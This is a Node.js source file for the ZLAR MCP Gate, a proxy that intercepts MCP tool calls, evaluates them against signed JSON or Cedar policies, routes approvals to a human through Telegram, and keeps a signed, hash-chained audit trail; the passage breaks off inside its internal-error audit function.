#!/usr/bin/env node
// ZLAR MCP Gate — vendor-agnostic governance proxy for MCP tool calls
//
// Sits between any MCP client and MCP server. Intercepts tools/call
// requests, evaluates policy, routes to human via Telegram when needed,
// writes to the same hash-chained audit trail as the bash gate.
//
// The gate doesn't reason. It intercepts. That's why it can't be subverted
// by reasoning.
//
// Usage:
//   node gate.mjs --port 3100 --upstream localhost:3200

import { createServer, createConnection } from 'net';
import { readFileSync, appendFileSync, existsSync, statSync, readdirSync, unlinkSync, writeFileSync, mkdirSync } from 'fs';
import { createHash, createHmac, randomBytes, timingSafeEqual, sign as cryptoSign, verify as cryptoVerify, createPublicKey } from 'crypto';
import { execSync, spawn } from 'child_process';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const PROJECT_DIR = join(__dirname, '..');

// Receipt generation (Phase A — Governed Action Receipt)
import {
  createReceiptFromEvent,
  signReceipt,
  pubkeyFingerprint,
  receiptHash,
  canonicalize,
  sha256hex
} from '../lib/receipt.mjs';

// Multi-canonical Ed25519 verification (see ADR-011)
import {
  canonicalFormVariants,
  verifyAnyCanonical,
} from '../lib/sig-verify.mjs';

// Human invariant enforcement (H6, H13, H14, H15, H17) + trust lane transitions
import {
  preAskCheck,
  postResponseCheck,
  recordAskTime,
  recordDecision,
  getCanaryTier,
  applyLaneDemotion,
  applyLaneRestore,
  recordCanaryOutcome,
  // v3.3.6 cross-session canary trigger lifecycle +
  // v3.3.7 Canary Evidence Hardening (claim CAS, delivery evidence)
  recordCanaryApproval,
  canaryShouldTrigger,
  canaryClaimPending,
  canaryRecordDelivery,
  canaryReleasePending,
  canaryClearPending,
  getCanaryPending,
} from '../lib/human-invariants.mjs';

// Cedar policy evaluation (Phase C — Cedar Integration)
import {
  cedarAvailable,
  cedarVersion,
  evaluate as cedarEvaluate,
  validatePolicies as cedarValidate,
  loadPoliciesFromFiles as cedarLoadFiles,
  mapToGateAction as cedarMapAction,
} from '../lib/cedar-evaluator.mjs';

// Constitutional validation (Second Authority Law parity with bash gate)
import {
  loadManifest,
  validateConstitution,
} from './constitution.mjs';

// Runtime manifest-authority enforcement (parity with bash gate 2175-2246)
import {
  enforceManifestAuthority,
} from './manifest-enforcement.mjs';

// Agent Health / Restore (parity with bin/zlar-gate lines 2455-2474)
import {
  initRestore,
  checkEscalation as restoreCheckEscalation,
  getRestoreState,
} from './restore.mjs';

// ─── Configuration ───────────────────────────────────────────────────────────

const CONFIG = {
  stdio: false,
  port: 3100,
  upstreamHost: null,
  upstreamPort: null,
  configFile: null,
  upstreamServerName: null,
  auditFile: join(PROJECT_DIR, 'var/log/audit.jsonl'),
  policyFile: join(PROJECT_DIR, 'etc/policies/active.policy.json'),
  policyPubkey: join(PROJECT_DIR, 'etc/keys/policy-signing.pub'),
  // Second Authority Law (parity with bash gate)
  constitutionFile: join(PROJECT_DIR, 'etc/constitution.json'),
  constitutionPubkey: join(PROJECT_DIR, 'etc/keys/constitution-signing.pub'),
  constitutionPresenceFile: join(PROJECT_DIR, 'var/log/.constitution-last-hash'),
  manifestFile: join(PROJECT_DIR, 'etc/manifest.json'),
  restoreConfigFile: join(PROJECT_DIR, 'etc/restore-config.json'),
  telegramToken: null,
  telegramChatId: null,
  telegramTimeoutS: 300,
  sessionId: randomBytes(16).toString('hex'),
  agentId: 'mcp-client',
  // Canary result check paths (v3.3.2 parity with bash canary_check_result).
  // Override via CLI or env for test isolation.
  canaryStateDir: process.env.ZLAR_CANARY_STATE_DIR || join(PROJECT_DIR, 'var/canary'),
  ccInboxDir: process.env.ZLAR_CC_INBOX_DIR || '/var/run/zlar-tg/inbox/cc',
  // Canary SEND config (v3.3.3 parity with bash canary_send).
  // Loaded from gate.json .canary block; env vars override for test isolation.
  canaryEnabled: true,
  canaryMinApprovals: 5,
  canaryProbability: 20,
  canaryCooldownS: 300,
  canaryScenarioFile: join(PROJECT_DIR, 'etc/canary-scenarios.json'),
  // v3.3.4 Clean Run Trust Lane Auto-Promotion. ZLAR does not score the
  // human. It watches the run.
  canaryCleanRunThreshold: 5,
  canaryAutoPromotion: true,
  // Receipt generation (Phase A)
  signingKey: join(process.env.HOME || '', '.zlar-signing.key'),
  signingPubkey: join(process.env.HOME || '', '.zlar-signing.pub'),
  receiptFile: join(PROJECT_DIR, 'var/log/receipts.jsonl'),
  emitReceipts: process.env.ZLAR_EMIT_RECEIPTS === 'true',
  // Cedar policy engine (Phase C) — when enabled, Cedar evaluates alongside or instead of JSON
  policyEngine: process.env.ZLAR_POLICY_ENGINE || 'json', // 'json', 'cedar', or 'both'
  host: process.env.ZLAR_MCP_HOST || '127.0.0.1',
};

// v3.3.7 — chat_id source tracking. Set during CLI parse / gate.json fallback;
// read by canaryChatIdSource() to populate the bin/zlar status surface and
// the canary_subsystem_misconfigured audit when the value is unconfigured.
let CHAT_ID_SOURCE = '';

// Parse CLI args
const args = process.argv.slice(2);
for (let i = 0; i < args.length; i++) {
  switch (args[i]) {
    case '--stdio': CONFIG.stdio = true; break;
    case '--config': CONFIG.configFile = args[++i]; break;
    case '--port': CONFIG.port = parseInt(args[++i]); break;
    case '--upstream': {
      const [host, port] = args[++i].split(':');
      CONFIG.upstreamHost = host;
      CONFIG.upstreamPort = parseInt(port);
      break;
    }
    case '--audit-file': CONFIG.auditFile = args[++i]; break;
    case '--policy-file': CONFIG.policyFile = args[++i]; break;
    case '--policy-pubkey': CONFIG.policyPubkey = args[++i]; break;
    case '--manifest-file': CONFIG.manifestFile = args[++i]; break;
    case '--constitution-file': CONFIG.constitutionFile = args[++i]; break;
    case '--constitution-presence-file': CONFIG.constitutionPresenceFile = args[++i]; break;
    case '--restore-config-file': CONFIG.restoreConfigFile = args[++i]; break;
    case '--agent-id': CONFIG.agentId = args[++i]; break;
    case '--telegram-chat-id':
      CONFIG.telegramChatId = args[++i];
      CHAT_ID_SOURCE = 'cli';
      break;
    case '--no-telegram':
      // Test-only. Disables every Telegram-dependent path (novelty
      // escalation, ask routing) by clearing both token and chat id and
      // suppressing the gate.json fallback. Leaves policy enforcement intact.
      CONFIG.telegramToken = '';
      CONFIG.telegramChatId = '';
      CONFIG.noTelegram = true;
      break;
    case '--session-id': CONFIG.sessionId = args[++i]; break;
    case '--canary-state-dir': CONFIG.canaryStateDir = args[++i]; break;
    case '--cc-inbox-dir': CONFIG.ccInboxDir = args[++i]; break;
    case '--canary-scenarios-file': CONFIG.canaryScenarioFile = args[++i]; break;
    case '--policy-engine': CONFIG.policyEngine = args[++i]; break;
    case '--help':
      console.log(`ZLAR MCP Gate — vendor-agnostic governance proxy

Usage:
  node gate.mjs --port 3100 --upstream localhost:3200
  node gate.mjs --stdio --config ./upstreams.json

Options:
  --stdio                 Run as an MCP stdio server (stdout is JSON-RPC only)
  --config <path>         Routing config for stdio mode
  --port <port>            Listen port (default: 3100)
  --upstream <host:port>   Upstream MCP server address (required)
  --policy-engine <kind>   Policy engine: json (default), cedar, or both
  --audit-file <path>      Audit trail path
  --policy-file <path>     Policy file path
  --policy-pubkey <path>   Policy signing public key (defaults to etc/keys/policy-signing.pub)
  --agent-id <id>          Agent identifier for audit trail
  --telegram-chat-id <id>  Telegram chat ID for HITL approvals
`);
      process.exit(0);
  }
}

if (CONFIG.stdio) {
  // MCP stdio reserves stdout for JSON-RPC frames. Route every operational
  // log emitted by existing shared code to stderr so startup/policy/audit
  // chatter cannot corrupt the client protocol stream.
  console.log = (...parts) => {
    console.error(...parts);
  };
}

// Load Telegram token from .env
function loadTelegramToken() {
  const envFile = join(PROJECT_DIR, '.env');
  if (!existsSync(envFile)) return null;
  const lines = readFileSync(envFile, 'utf8').split('\n');
  for (const line of lines) {
    const match = line.match(/^(TELEGRAM_BOT_TOKEN|ZLAR_TELEGRAM_TOKEN)=["']?([^"'\s]+)/);
    if (match) return match[2];
  }
  return null;
}

if (!CONFIG.noTelegram) {
  CONFIG.telegramToken = process.env.ZLAR_TELEGRAM_TOKEN || loadTelegramToken();
}
if (!CONFIG.telegramChatId && !CONFIG.noTelegram) {
  // Try loading from gate.json
  const gateConfigPath = join(PROJECT_DIR, 'etc/gate.json');
  if (existsSync(gateConfigPath)) {
    try {
      const gateConfig = JSON.parse(readFileSync(gateConfigPath, 'utf8'));
      CONFIG.telegramChatId = gateConfig?.telegram?.chat_id;
      if (CONFIG.telegramChatId) CHAT_ID_SOURCE = 'gate.json';
      if (gateConfig?.telegram?.timeout_s) CONFIG.telegramTimeoutS = gateConfig.telegram.timeout_s;
      if (gateConfig?.emit_receipts === true) CONFIG.emitReceipts = true;
    } catch (e) {
      // Can't call auditInternalError here — emitEvent isn't defined yet at
      // module load time. Log to stderr so operators see config corruption.
      console.error(`[gate] WARN: gate.json parse failed: ${e.message}`);
    }
  }
}

// Load canary SEND config from gate.json .canary block (independent of
// telegram chat-id check so canary config loads even when chat-id is
// provided via CLI). Env vars take final precedence for test isolation.
{
  const gateConfigPath = join(PROJECT_DIR, 'etc/gate.json');
  if (existsSync(gateConfigPath)) {
    try {
      const gc = JSON.parse(readFileSync(gateConfigPath, 'utf8'));
      if (gc?.canary?.enabled !== undefined && process.env.ZLAR_CANARY_ENABLED === undefined)
        CONFIG.canaryEnabled = gc.canary.enabled;
      if (gc?.canary?.min_approvals_before_trigger && process.env.ZLAR_CANARY_MIN_APPROVALS === undefined)
        CONFIG.canaryMinApprovals = gc.canary.min_approvals_before_trigger;
      if (gc?.canary?.probability_percent !== undefined && process.env.ZLAR_CANARY_PROBABILITY === undefined)
        CONFIG.canaryProbability = gc.canary.probability_percent;
      if (gc?.canary?.cooldown_s && process.env.ZLAR_CANARY_COOLDOWN === undefined)
        CONFIG.canaryCooldownS = gc.canary.cooldown_s;
      if (gc?.canary?.scenarios_file && !process.env.ZLAR_CANARY_SCENARIOS_FILE)
        CONFIG.canaryScenarioFile = join(PROJECT_DIR, gc.canary.scenarios_file);
      if (gc?.canary?.clean_run_promotion_threshold !== undefined && process.env.ZLAR_CANARY_PROMOTION_THRESHOLD === undefined)
        CONFIG.canaryCleanRunThreshold = gc.canary.clean_run_promotion_threshold;
      if (gc?.canary?.auto_promotion_enabled !== undefined && process.env.ZLAR_CANARY_AUTO_PROMOTION === undefined)
        CONFIG.canaryAutoPromotion = gc.canary.auto_promotion_enabled;
    } catch (e) {
      console.error(`[gate] WARN: canary config load failed: ${e.message}`);
    }
  }
  if (process.env.ZLAR_CANARY_ENABLED !== undefined) CONFIG.canaryEnabled = process.env.ZLAR_CANARY_ENABLED === 'true';
  if (process.env.ZLAR_CANARY_MIN_APPROVALS) CONFIG.canaryMinApprovals = parseInt(process.env.ZLAR_CANARY_MIN_APPROVALS, 10);
  if (process.env.ZLAR_CANARY_PROBABILITY !== undefined) CONFIG.canaryProbability = parseInt(process.env.ZLAR_CANARY_PROBABILITY, 10);
  if (process.env.ZLAR_CANARY_COOLDOWN !== undefined) CONFIG.canaryCooldownS = parseInt(process.env.ZLAR_CANARY_COOLDOWN, 10);
  if (process.env.ZLAR_CANARY_SCENARIOS_FILE) CONFIG.canaryScenarioFile = process.env.ZLAR_CANARY_SCENARIOS_FILE;
  if (process.env.ZLAR_CANARY_PROMOTION_THRESHOLD !== undefined) CONFIG.canaryCleanRunThreshold = parseInt(process.env.ZLAR_CANARY_PROMOTION_THRESHOLD, 10);
  if (process.env.ZLAR_CANARY_AUTO_PROMOTION !== undefined) CONFIG.canaryAutoPromotion = process.env.ZLAR_CANARY_AUTO_PROMOTION === 'true';
}

// ─── PQC Metadata ────────────────────────────────────────────────────────────

const SIGNATURE_ALGORITHM = 'Ed25519';
const HASH_ALGORITHM = 'SHA-256';
let PUBLIC_KEY_ID = 'unknown';
if (existsSync(CONFIG.policyPubkey)) {
  const keyHash = createHash('sha256').update(readFileSync(CONFIG.policyPubkey)).digest('hex');
  PUBLIC_KEY_ID = keyHash.substring(0, 16);
}

// ─── Policy Engine ───────────────────────────────────────────────────────────

let POLICY = null;
let POLICY_VERSION = 'unknown';
let POLICY_MTIME_MS = 0;
let STANDING_APPROVALS_MTIME_MS = 0;

// Session-scoped novelty tracker. See novelty-escalation comment below in
// handleRequest. Reset implicitly on process restart (new session = new
// paranoia). In-memory only by design — we don't want an attacker who
// compromised a past session to grant future sessions a free pass.
const SEEN_TOOLS = new Set();

// Reload policy and standing approvals if the underlying files changed on
// disk since the last load. Bash-gate parity: bash re-reads per hook
// invocation; the MCP gate is long-running, so the operator-rotate path
// needs an explicit re-read. Called at the start of every request.
function maybeReloadPolicyAndSA() {
  try {
    if (existsSync(CONFIG.policyFile)) {
      const m = statSync(CONFIG.policyFile).mtimeMs;
      if (m !== POLICY_MTIME_MS) {
        loadPolicy();
        POLICY_MTIME_MS = m;
      }
    }
  } catch (e) {
    console.error(`[gate] WARN: policy mtime check failed: ${e.message}`);
  }
  const saFile = join(PROJECT_DIR, 'etc/standing-approvals.json');
  try {
    if (existsSync(saFile)) {
      const m = statSync(saFile).mtimeMs;
      if (m !== STANDING_APPROVALS_MTIME_MS) {
        loadStandingApprovals();
        STANDING_APPROVALS_MTIME_MS = m;
      }
    } else if (STANDING_APPROVALS_MTIME_MS !== 0) {
      // File deleted since last load — clear approvals.
      STANDING_APPROVALS = [];
      STANDING_APPROVALS_LOADED = false;
      STANDING_APPROVALS_MTIME_MS = 0;
    }
  } catch (e) {
    console.error(`[gate] WARN: standing-approvals mtime check failed: ${e.message}`);
  }
}

// ─── Signature Verification ──────────────────────────────────────────────────
// Shared by policy and standing approval verification. Matches bash gate approach:
// canonical (with signature zeroed) → SHA-256 hex → Ed25519 verify hex bytes.

function verifyJsonSignature(obj, publicKeyPath) {
  if (!existsSync(publicKeyPath)) return { ok: false, reason: 'public key not found' };

  const sig = obj?.signature;
  if (!sig?.value) return { ok: false, reason: 'no signature in file' };

  try {
    const pubKeyPem = readFileSync(publicKeyPath, 'utf8');

    // Zero ONLY .signature.value — matches the policy / standing-approvals
    // signing convention in bash (`jq '.signature.value = ""'`). Algorithm
    // and public_key fields are preserved in the canonical form.
    const cleared = JSON.parse(JSON.stringify(obj));
    cleared.signature = { ...cleared.signature, value: '' };

    // Verify under any of the three canonical forms currently in use in
    // the project. See ADR-011 and lib/sig-verify.mjs.
    const forms = canonicalFormVariants(cleared);
    const result = verifyAnyCanonical(forms, pubKeyPem, sig.value);
    if (result.ok && result.form !== 'spec') {
      console.warn(`[gate] WARN: signature verified under LEGACY canonical form "${result.form}". Migration tracked by ADR-011.`);
    }
    return result;
  } catch (e) {
    return { ok: false, reason: e.message };
  }
}

function loadPolicy() {
  if (!existsSync(CONFIG.policyFile)) {
    console.error(`[gate] CRITICAL: Policy file not found: ${CONFIG.policyFile} — fail-closed`);
    POLICY = { rules: [], default_action: 'deny', version: 'fail-closed' };
    POLICY_VERSION = 'fail-closed';
    return;
  }
  try {
    const raw = JSON.parse(readFileSync(CONFIG.policyFile, 'utf8'));

    // Ed25519 policy signature verification (parity with bash gate: required).
    // Fail-closed on missing pubkey, missing signature, or invalid signature.
    if (!existsSync(CONFIG.policyPubkey)) {
      console.error('[gate] FATAL: Policy public key not found — fail-closed');
      POLICY = { rules: [], default_action: 'deny', version: 'fail-closed-nopub' };
      POLICY_VERSION = 'fail-closed-nopub';
      return;
    }
    if (!raw.signature?.value) {
      console.error('[gate] FATAL: Policy is unsigned — fail-closed');
      POLICY = { rules: [], default_action: 'deny', version: 'fail-closed-unsigned' };
      POLICY_VERSION = 'fail-closed-unsigned';
      return;
    }
    const result = verifyJsonSignature(raw, CONFIG.policyPubkey);
    if (!result.ok) {
      console.error(`[gate] CRITICAL: Policy signature INVALID (${result.reason}) — fail-closed`);
      POLICY = { rules: [], default_action: 'deny', version: 'fail-closed-sig' };
      POLICY_VERSION = 'fail-closed-sig';
      return;
    }
    console.log('[gate] Policy signature verified');

    POLICY = raw;
    POLICY_VERSION = POLICY.version || 'unknown';
  } catch (e) {
    console.error(`[gate] CRITICAL: Failed to parse policy: ${e.message} — fail-closed`);
    POLICY = { rules: [], default_action: 'deny', version: 'fail-closed' };
    POLICY_VERSION = 'fail-closed';
  }
}

function evaluatePolicy(toolName, args) {
  if (!POLICY?.rules) {
    console.error(`[gate] No policy loaded — DENYING (fail-closed)`);
    return { action: 'deny', rule: 'no-policy', riskScore: 100, severity: 'critical' };
  }

  const domain = 'mcp';
  const actionStr = `${toolName}(${JSON.stringify(args).substring(0, 100)})`;

  for (const rule of POLICY.rules) {
    if (!rule.enabled) continue;

    // Match MCP-specific rules (domain === "mcp")
    if (rule.domain && rule.domain !== 'mcp') continue;

    // Check tool name match
    if (rule.match?.detail?.tool_name) {
      const matcher = rule.match.detail.tool_name;
      if (matcher.eq && matcher.eq !== toolName) continue;
      if (matcher.regex && !new RegExp(matcher.regex).test(toolName)) continue;
      if (matcher.contains && !toolName.includes(matcher.contains)) continue;
    }

    // Check argument patterns
    if (rule.match?.detail?.arguments) {
      const argStr = JSON.stringify(args);
      const matcher = rule.match.detail.arguments;
      if (matcher.regex && !new RegExp(matcher.regex).test(argStr)) continue;
      if (matcher.contains && !argStr.includes(matcher.contains)) continue;
    }

    // compound_guard (bash gate lines 1380-1398): secondary AND condition.
    // Must pass AFTER detail matches. If it fails, skip this rule and continue.
    // Found via cross-gate differential test: R012BR has a compound_guard that
    // restricts "audit file read" to safe read commands only (cat/head/tail/etc).
    // Without this check, any command touching audit.jsonl would match R012BR
    // (allow) instead of falling through to R012B (deny). Both conditions must
    // hold: the file pattern AND the safe-command guard.
    if (rule.match?.compound_guard) {
      const cg = rule.match.compound_guard;
      let guardPassed = true;
      for (const [key, matcher] of Object.entries(cg)) {
        const actual = String(args?.[key] ?? '');
        if (matcher.regex    && !new RegExp(matcher.regex).test(actual))    { guardPassed = false; break; }
        if (matcher.eq       && matcher.eq !== actual)                      { guardPassed = false; break; }
        if (matcher.contains && !actual.includes(matcher.contains))         { guardPassed = false; break; }
        if (matcher.not_regex && new RegExp(matcher.not_regex).test(actual)) { guardPassed = false; break; }
      }
      if (!guardPassed) continue;
    }

    // Rule matched
    const rs = rule.risk_score || {};
    const riskScore = Math.max(rs.irreversibility || 0, rs.consequence || 0, rs.blast_radius || 0);
    return {
      action: rule.action || 'deny',
      rule: rule.id || 'unknown',
      riskScore,
      severity: rule.severity || 'info',
      description: rule.description || '',
      verifyHint: rule.verify_hint || '',
    };
  }

  // Default action
  return {
    action: POLICY.default_action || 'deny',
    rule: 'default',
    riskScore: 0,
    severity: 'info',
  };
}

// ─── Cedar Policy Engine (Phase C) ───────────────────────────────────────────
// Cedar evaluates alongside or instead of JSON regex. Both engines produce
// the same receipt format. The gate doesn't know which engine ran.

let CEDAR_SCHEMA = null;
let CEDAR_POLICIES = null;
let CEDAR_POLICY_ID_MAP = {};
let CEDAR_LOADED = false;

function loadCedar() {
  if (CONFIG.policyEngine === 'json') return; // Cedar not requested

  if (!cedarAvailable()) {
    console.error('[gate] WARN: Cedar requested but WASM not available — falling back to JSON');
    if (CONFIG.policyEngine === 'cedar') {
      console.error('[gate] CRITICAL: Cedar-only mode with no Cedar — fail-closed');
      POLICY = { rules: [], default_action: 'deny', version: 'fail-closed-cedar' };
      POLICY_VERSION = 'fail-closed-cedar';
    }
    return;
  }

  const loaded = cedarLoadFiles();
  if (!loaded) {
    console.error('[gate] WARN: No Cedar policy files found');
    if (CONFIG.policyEngine === 'cedar') {
      console.error('[gate] CRITICAL: Cedar-only mode with no policies — fail-closed');
      POLICY = { rules: [], default_action: 'deny', version: 'fail-closed-cedar' };
      POLICY_VERSION = 'fail-closed-cedar';
    }
    return;
  }

  const validation = cedarValidate({ schema: loaded.schema, policies: loaded.policies });
  if (!validation.ok) {
    console.error(`[gate] CRITICAL: Cedar policy validation failed: ${validation.error}`);
    if (CONFIG.policyEngine === 'cedar') {
      POLICY = { rules: [], default_action: 'deny', version: 'fail-closed-cedar' };
      POLICY_VERSION = 'fail-closed-cedar';
    }
    return;
  }

  CEDAR_SCHEMA = loaded.schema;
  CEDAR_POLICIES = loaded.policies;
  CEDAR_POLICY_ID_MAP = loaded.policyIdMap || {};
  CEDAR_LOADED = true;
  console.log(`[gate] Cedar policies loaded: ${loaded.files.length} files (Cedar ${cedarVersion()})`);
}

// Wrap evaluatePolicy to support both engines
function evaluatePolicyDual(toolName, args) {
  const engine = CONFIG.policyEngine;

  if (engine === 'json' || (engine === 'both' && !CEDAR_LOADED)) {
    return evaluatePolicy(toolName, args);
  }

  if (engine === 'cedar' || engine === 'both') {
    if (!CEDAR_LOADED) {
      // Fail-closed: Cedar requested but not loaded
      return { action: 'deny', rule: 'cedar-unavailable', riskScore: 100, severity: 'critical' };
    }

    // Cedar evaluation
    const command = typeof args === 'object' ? JSON.stringify(args) : String(args);
    const result = cedarEvaluate({
      schema: CEDAR_SCHEMA,
      policies: CEDAR_POLICIES,
      agentId: CONFIG.agentId,
      toolName,
      command: `${toolName} ${command}`,
      domain: 'mcp',
      policyVersion: POLICY_VERSION,
    });

    if (result.error) {
      console.error(`[gate] Cedar evaluation error: ${result.error} — fail-closed`);
      return { action: 'deny', rule: 'cedar-error', riskScore: 100, severity: 'critical' };
    }

    const mapped = cedarMapAction(result, CEDAR_POLICY_ID_MAP);

    if (engine === 'both') {
      // Both engines: stricter result wins on divergence (DWP-01)
      const jsonResult = evaluatePolicy(toolName, args);
      if (jsonResult.action !== mapped.action) {
        console.log(`[gate] Engine divergence: JSON=${jsonResult.action} Cedar=${mapped.action} — stricter wins`);
        const order = { deny: 0, ask: 1, allow: 2 };
        return (order[mapped.action] ?? 1) <= (order[jsonResult.action] ?? 1) ? mapped : jsonResult;
      }
      return jsonResult;
    }

    return mapped;
  }

  // Unknown engine — fail-closed
  return { action: 'deny', rule: 'unknown-engine', riskScore: 100, severity: 'critical' };
}

// ─── Constitutional Validation (Second Authority Law) ──────────────────────
// Parity with bash gate validate_constitution() at bin/zlar-gate:991-1149.
// Called at startup AND on every tools/call to catch mid-run tamper. The
// validateConstitution module caches by constitution file hash, so the hot
// path is a single SHA-256 read.
//
// Fail-closed semantics: if the constitution has been deployed (presence
// tracker exists) and validation fails for any reason, the gate denies all
// subsequent tool calls until the condition is cleared. Pre-constitutional
// mode (no tracker) is an explicit pass state.
//
// Audit: one `constitution.invalid` event is emitted on each transition
// from ok → fail, so the audit trail records tamper events without spamming.

let MANIFEST = null;
let MANIFEST_LOAD_REASON = null;
let MANIFEST_HARD_DENY_REASON = null;
let CONSTITUTION_VALID = true;
let CONSTITUTION_FAIL_REASON = null;
let CONSTITUTION_LAST_OK = true;

function loadManifestAndValidateConstitution(emitOnChange = true) {
  // Reload manifest every time we revalidate — the manifest-deny set
  // participates in PC-05b and can change between tool calls if the
  // operator rotates it.
  const m = loadManifest(CONFIG.manifestFile, CONFIG.policyPubkey);
  if (m.ok) {
    MANIFEST = m.manifest;
    MANIFEST_LOAD_REASON = null;
    MANIFEST_HARD_DENY_REASON = null;
  } else {
    MANIFEST = null;
    MANIFEST_LOAD_REASON = m.reason;
    // Bash-gate parity (invariant #8): tampered / expired / parse-corrupt /
    // signed-but-unverifiable manifests are hard-deny. A missing manifest
    // file is the only no-manifest state that falls back to policy-only
    // (invariant #7). Anything that looks like active tampering denies.
    const reason = m.reason || '';
    const isMissing = reason === 'manifest file not found';
    MANIFEST_HARD_DENY_REASON = isMissing ? null : reason;
  }

  const result = validateConstitution({
    constitutionFile: CONFIG.constitutionFile,
    constitutionPubkey: CONFIG.constitutionPubkey,
    constitutionPresenceFile: CONFIG.constitutionPresenceFile,
    policyPubkey: CONFIG.policyPubkey,
    policy: POLICY,
    manifest: MANIFEST,
    restoreConfigFile: CONFIG.restoreConfigFile,
  });

  const wasOk = CONSTITUTION_LAST_OK;
  if (result.ok) {
    CONSTITUTION_VALID = true;
    CONSTITUTION_FAIL_REASON = null;
    CONSTITUTION_LAST_OK = true;
  } else {
    CONSTITUTION_VALID = false;
    CONSTITUTION_FAIL_REASON = result.reason;
    CONSTITUTION_LAST_OK = false;
    // Emit audit event only on ok → fail transition (not every call)
    if (emitOnChange && wasOk) {
      try {
        emitEvent('mcp', 'constitution.invalid', 'deny',
          { reason: result.reason, manifest_load: MANIFEST_LOAD_REASON },
          'constitution.invalid', 'critical', 100, 'gate');
      } catch (e) {
        auditInternalError('constitution_invalid_emit', e, { transition: 'ok_to_fail' });
      }
    }
  }
  return result;
}

// ─── Standing Approvals ──────────────────────────────────────────────────────
// Pre-authorized patterns that skip Telegram escalation. Same format as bash gate.
// Signed with policy key. Fail-soft: invalid/missing → no standing approvals (ask Telegram).

let STANDING_APPROVALS = [];
let STANDING_APPROVALS_LOADED = false;

function loadStandingApprovals() {
  const saFile = join(PROJECT_DIR, 'etc/standing-approvals.json');
  if (!existsSync(saFile)) return;

  try {
    const raw = JSON.parse(readFileSync(saFile, 'utf8'));

    // Signature required whenever the policy pubkey exists (parity with bash gate).
    // Unsigned / missing-signature standing approvals are refused — approvals disabled.
    if (existsSync(CONFIG.policyPubkey)) {
      if (!raw.signature?.value) {
        console.error('[gate] WARN: Standing approvals unsigned — approvals disabled');
        return;
      }
      const result = verifyJsonSignature(raw, CONFIG.policyPubkey);
      if (!result.ok) {
        console.error(`[gate] WARN: Standing approvals signature invalid (${result.reason}) — approvals disabled`);
        return;
      }
    }

    STANDING_APPROVALS = raw.approvals || [];
    STANDING_APPROVALS_LOADED = true;
    console.log(`[gate] Standing approvals loaded: ${STANDING_APPROVALS.length} entries`);
  } catch (e) {
    console.error(`[gate] WARN: Failed to load standing approvals: ${e.message}`);
  }
}

/**
 * Check if an action matches a standing approval.
 * @param {string} ruleId - The policy rule that triggered the ask
 * @param {string} toolName - The MCP tool name
 * @param {object} args - The tool arguments
 * @returns {{ match: boolean, approvalId: string|null }}
 */
function checkStandingApproval(ruleId, toolName, args) {
  if (!STANDING_APPROVALS_LOADED) return { match: false, approvalId: null };

  const today = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
  const commandText = `${toolName} ${JSON.stringify(args)}`;

  for (const sa of STANDING_APPROVALS) {
    // Must match rule_id
    if (sa.rule_id !== ruleId) continue;

    // Check expiry
    if (sa.expires && today > sa.expires) continue;

    // Check match patterns
    const matcher = sa.match?.command;
    if (!matcher) continue;

    if (matcher.contains && commandText.includes(matcher.contains)) {
      return { match: true, approvalId: sa.id };
    }
    if (matcher.regex) {
      try {
        if (new RegExp(matcher.regex).test(commandText)) {
          return { match: true, approvalId: sa.id };
        }
      } catch (e) {
        // Invalid regex in a standing approval is an authoring bug worth
        // surfacing in the chain — otherwise a broken SA silently never
        // matches and the operator doesn't know why.
        auditInternalError('sa_regex_parse', e, { approval_id: sa.id, pattern: matcher.regex });
      }
    }
  }

  return { match: false, approvalId: null };
}

// ─── Audit Trail ─────────────────────────────────────────────────────────────

// Cache hostname/username at startup (not per-event — execSync is expensive)
const HOSTNAME = (() => { try { return execSync('hostname -s', { encoding: 'utf8' }).trim(); } catch { return 'unknown'; } })();
const USERNAME = (() => { try { return execSync('whoami', { encoding: 'utf8' }).trim(); } catch { return 'unknown'; } })();

let SEQ = 0;
let PREV_RECEIPT_HASH = null;
let SIGNING_KEY_PEM = null;
let SIGNING_KEY_ID = null;

// Audit-signing policy.
//
// The MCP gate defaults to STRICT signed audit: if the signing key is
// missing or signing fails, the gate refuses to write an audit entry
// rather than silently falling back to an unsigned one. This is the
// Jidoka inversion — easy to stop, hard to go. The audit chain is the
// only evidence that survives after everyone involved is dead; an
// unsigned entry is functionally equivalent to no entry for forensic
// purposes, so the right default is "no signature, no write."
//
// Bash gate defaults to advisory (ZLAR_REQUIRE_SIGNED_AUDIT=false) for
// historical parity; MCP flips it because the daemon shape of the MCP
// gate makes a silent signing failure much harder to notice in ops.
//
// To explicitly opt out (e.g., during testing without a signing key in
// place), set ZLAR_REQUIRE_SIGNED_AUDIT=false in the environment.
const REQUIRE_SIGNED_AUDIT = (process.env.ZLAR_REQUIRE_SIGNED_AUDIT || 'true').toLowerCase() !== 'false';

// Load signing key — used for both per-entry audit signing and receipt generation.
if (existsSync(CONFIG.signingKey)) {
  try {
    SIGNING_KEY_PEM = readFileSync(CONFIG.signingKey, 'utf8');
    if (existsSync(CONFIG.signingPubkey)) {
      SIGNING_KEY_ID = pubkeyFingerprint(CONFIG.signingPubkey);
    }
    console.log(`[gate] Signing key loaded (key_id: ${SIGNING_KEY_ID || 'unknown'})`);
  } catch (e) {
    console.error(`[gate] WARN: Cannot load signing key: ${e.message}`);
  }
}

// Startup fail-closed when strict mode is on and no key is available.
// Emitting events without a key would produce "unsigned" entries that
// pollute the chain; refusing to start is the only honest response.
if (REQUIRE_SIGNED_AUDIT && !SIGNING_KEY_PEM) {
  console.error('[gate] FATAL: ZLAR_REQUIRE_SIGNED_AUDIT is true (default) but no signing key is available at ' + CONFIG.signingKey);
  console.error('[gate] FATAL: Refusing to start — unsigned audit entries cannot be used as governance evidence.');
  console.error('[gate] FATAL: Either install a signing key, or set ZLAR_REQUIRE_SIGNED_AUDIT=false explicitly.');
  process.exit(1);
}

// Re-entry guard for auditInternalError. If the audit write path is the
// thing that threw, trying to emit another audit event from inside the
// catch would recurse. When this flag is set, auditInternalError falls
// back to stderr only.
let _AUDITING_INTERNAL_ERROR = false;

// Turn every caught exception into a signed audit event. The audit
// chain becomes the single source of truth for everything that
// happened in the gate, INCLUDING its own failures. An attacker who
// intentionally induces errors to muddy the record leaves MORE
// evidence behind, not less.
//
// Call sites replace bare `catch {}` and `catch (e) { console.error(e) }`.
// The `phase` argument names the code region so forensic analysts can
// cluster events (e.g., "policy_load", "sa_load", "hash_chain_read").
function auditInternalError(phase, err, detail) {
  const msg = err?.message || String(err);
  const stack = (err?.stack || '').substring(0, 500);
